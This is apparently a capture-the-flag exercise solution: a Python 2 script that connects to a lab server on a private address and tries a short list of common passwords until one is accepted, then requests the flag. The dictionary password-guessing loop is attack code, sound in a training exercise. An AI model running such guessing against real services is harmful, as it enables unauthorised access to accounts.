# Problem 5: Follow the example code at python.org to write a TCP client. Connect to IP address 192.168.14.30 on TCP port 2005 and the server will ask you for the password. If you provide the correct password, you may demand the flag as in Problem 4, and the server will send it to you.

import socket

TCP_IP = '192.168.14.30'
TCP_PORT = 2005

passwords = ['red', 'blue', 'gray', 'purple', 'elephant', 'monkey',
             'lion', 'tiger', 'bear', 'password', 'hunter', 'dog', 'cat', 'swordfish']
i = 0
data = ""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TCP_IP, TCP_PORT))
while data.strip() == "PASSWORD" or data.strip() == "ACCESS DENIED" or data.strip() == "":
    data = sock.recv(10)
    print "received data: ", data
    print "trying password " + passwords[i]
    sock.send(passwords[i])
    i = i + 1
    data = sock.recv(14)
    print "received data: ", data
    if data.strip() == "ACCESS DENIED":
        sock.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TCP_IP, TCP_PORT))
    else:
        break
sock.send("GET FLAG")
data = sock.recv(22)
print "received data: ", data
